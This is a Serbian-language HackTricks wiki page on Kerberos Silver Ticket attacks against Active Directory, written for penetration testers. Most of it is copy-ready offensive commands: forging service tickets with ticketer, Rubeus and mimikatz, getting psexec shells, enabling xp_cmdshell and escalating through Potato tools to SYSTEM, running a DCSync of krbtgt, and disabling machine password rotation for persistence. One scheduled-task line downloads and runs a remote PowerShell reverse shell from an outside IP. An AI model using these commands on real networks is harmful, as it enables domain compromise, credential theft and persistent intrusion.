# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Napad **Silver Ticket** uključuje iskorišćavanje service tickets u Active Directory (AD) okruženjima. Ova metoda se zasniva na **acquiring the NTLM hash of a service account**, kao što je computer account, kako bi se forgedovao Ticket Granting Service (TGS) ticket. Pomoću ovog forged ticket-a napadač može pristupiti određenim servisima na mreži, **impersonating any user**, obično sa ciljem sticanja administratorskih privilegija. Naglašeno je da je korišćenje AES keys za forging tickets sigurnije i teže za detekciju.

> [!WARNING]
> Silver Tickets su manje detektabilni od Golden Tickets zato što zahtevaju samo **hash of the service account**, a ne krbtgt account. Međutim, ograničeni su na konkretan servis na koji ciljaju. Takođe, dovoljno je samo ukrasti lozinku korisnika.
> 
> Ukoliko kompromitujete **account's password with a SPN**, možete tu lozinku iskoristiti za kreiranje Silver Ticket-a koji impersonates any user prema tom servisu.

Za kreiranje tiketa koriste se različiti alati u zavisnosti od operativnog sistema:

### Na Linuxu
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Na Windowsu
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS servis je istaknut kao česta meta za pristup fajl sistemu žrtve, ali i drugi servisi poput HOST i RPCSS mogu se iskoristiti za zadatke i WMI upite.

### Primer: MSSQL servis (MSSQLSvc) + Potato na SYSTEM

Ako imate NTLM hash (ili AES key) za SQL service account (npr. sqlsvc), možete falsifikovati TGS za MSSQL SPN i lažno se predstaviti kao bilo koji korisnik prema SQL servisu. Zatim omogućite xp_cmdshell da izvršavate komande kao SQL service account. Ako taj token ima SeImpersonatePrivilege, iskoristite Potato da eskalirate privilegije na SYSTEM.
```bash
# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Ako kontekst koji je dobijen ima SeImpersonatePrivilege (često tačno za servisne naloge), koristi Potato varijantu da dobiješ SYSTEM:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Više detalja o zloupotrebi MSSQL i omogućavanju xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato techniques overview:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Dostupne usluge

| Tip usluge                                 | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>U zavisnosti od OS-a takođe:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>U nekim slučajevima možete jednostavno zatražiti: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Korišćenjem **Rubeus** možete **zatražiti sve** ove tikete koristeći parametar:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Event ID-ovi za Silver tikete

- 4624: Prijava naloga
- 4634: Odjava naloga
- 4672: Administratorsko prijavljivanje

## Održavanje pristupa

Da biste sprečili da mašine rotiraju svoje lozinke svakih 30 dana, podesite `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ili možete podesiti `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` na veću vrednost od 30 dana da naznačite period rotacije kada lozinka mašine treba da bude promenjena.

## Zloupotreba Service tiketa

U sledećim primerima pretpostavimo da je tiket pribavljen predstavljanjem administratorskog naloga.

### CIFS

Sa ovim tiketom moći ćete da pristupite folderima `C$` i `ADMIN$` preko **SMB** (ako su izloženi) i kopirate fajlove u deo udaljenog fajl sistema jednostavnim izvršavanjem nečeg poput:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Takođe ćete moći da dobijete shell unutar hosta ili izvršite proizvoljne commands koristeći **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Sa ovom dozvolom možete kreirati scheduled tasks na remote computers i izvršavati proizvoljne commands:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Pomoću ovih tickets možete **izvršiti WMI na sistemu žrtve**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Pronađite **više informacija o wmiexec** na sledećoj stranici:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Sa winrm pristupom na računaru možete mu pristupiti i čak dobiti PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Pogledajte sledeću stranicu da saznate **još načina za povezivanje sa udaljenim hostom koristeći winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Imajte na umu da **winrm mora biti aktivan i osluškivati** na udaljenom računaru da biste mu pristupili.

### LDAP

Sa ovim privilegijama možete preuzeti kopiju baze podataka DC-a koristeći **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Saznajte više o DCSync** na sledećoj stranici:


{{#ref}}
dcsync.md
{{#endref}}


## Izvori

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)



{{#include ../../banners/hacktricks-training.md}}
